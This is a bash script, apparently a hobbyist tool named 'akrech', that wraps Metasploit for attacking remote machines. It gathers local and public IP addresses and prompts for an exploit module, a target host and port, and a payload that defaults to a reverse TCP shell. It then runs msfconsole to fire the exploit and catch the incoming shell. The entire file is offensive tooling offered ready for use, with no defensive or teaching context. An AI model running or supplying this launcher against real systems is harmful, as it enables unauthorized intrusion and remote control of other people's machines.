#!/bin/bash

echo -e "\e[31m[*]checking your network & network interface\e[0m" 
echo -e "\e[31m[*]please wait or re-run akrech\e[0m"
eth0=`ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`

tun0=`ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`

wlan0=`ip -4 addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'`

pubip=`curl ifconfig.me`
echo -e "\e[31m[*]yap we ready to hunt!!! let's go <3\e[0m"
sleep 2

clear;

echo -e "\e[41m
▄▀█ █▄▀ █▀█ █▀▀ █▀▀ █░█
█▀█ █░█ █▀▄ ██▄ █▄▄ █▀█\e[0m"
echo -e "\e[40;38;5;82mgithub:- a-k-r-e-c-h
\e[30;48;5;82mmail:- akrech@protonmail.com\e[0m"
for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m####\e[0m" ; done ; echo
echo -e "\e[31m<==================\e[0m\e[1m\e[5mHAPPY-HUNTING\e[0m\e[31m===============>\e[0m"
for i in {16..21} {21..16} ; do echo -en "\e[38;5;${i}m####\e[0m" ; done ; echo 

echo -e "\e[41m[+]ENTER-exploit-MODULE[exploit]\e[5m➲ \e[0m \e[32m[default: exploit/multi/handler]
                                \e[5m➲\e[0m  \e[32m[press 'enter' for auto selection]\e[0m"
read -p ">" EXPLOIT 

echo -e "\e[41m[+]ENTER REMOTE IP      [RHOSTS]\e[5m➲ \e[0m \e[32m[press 'enter' if RHOST not needed]\e[0m
"
read -p ">" RHOST


echo -e "\e[41m[+]ENTER REMOTE PORT     [RPORT]\e[5m➲ \e[0m \e[32m[press 'enter' if RPORT not needed]\e[0m
"
read -p ">" RPORT


echo -e "\e[41m[+]ENTER-payload-MODULE[payload]\e[5m➲ \e[0m \e[32m[default: generic/shell_reverse_tcp]
                                \e[5m➲\e[0m  \e[32m[press 'enter' for auto selection]\e[0m"
read -p ">" PAYLOAD


echo -e "\e[41m[+]ENTER LOCAL IP        [LHOST]\e[5m➲ \e[0m\e[32m [wlan0 -> $wlan0]
                                   [eth0 -> $eth0]
                                   [tun0 -> $tun0]
                                   [public IP -> $pubip]\e[0m"
read -p">" IP


echo -e "\e[41m[+]ENTER LISTENING PORT  [LPORT]\e[5m➲ \e[0m\e[32m [default: 4444]
                                   [enter any port number]\e[0m"
read -p ">" PORT


echo -e "\e[34m[*]Starting\e[0m \e[91mMetasploit\e[0m \e[34mwith given commands...\e[0m"
sleep 1
echo -e "\e[34m[*]set LHOST as $IP\e[0m"
sleep 1
if [ -z "$PORT" ]
then
    echo -e "\e[34m[*]set LPORT as 4444\e[0m" 
else
    echo -e "\e[34m[*]set LPORT as $PORT\e[0m"
fi
sleep 1
echo -e "\e[36m[*]press (CTRL + C) or re-run akrech, if you want any change in modules...\e[0m"
sleep 1
echo -e "\e[36m[!]\e[0m\e[41makrech\e[0m\e[36m is going to clear your terminal, for a clear view... \e[0m"
sleep 1
msfconsole -q -x "
clear;
use exploit/multi/handler;
clear;
use $EXPLOIT;
set payload $PAYLOAD;
clear;
set rhost $RHOST;
set rport $RPORT;
set lport $PORT;
set lhost $IP;
clear;
exploit ;"
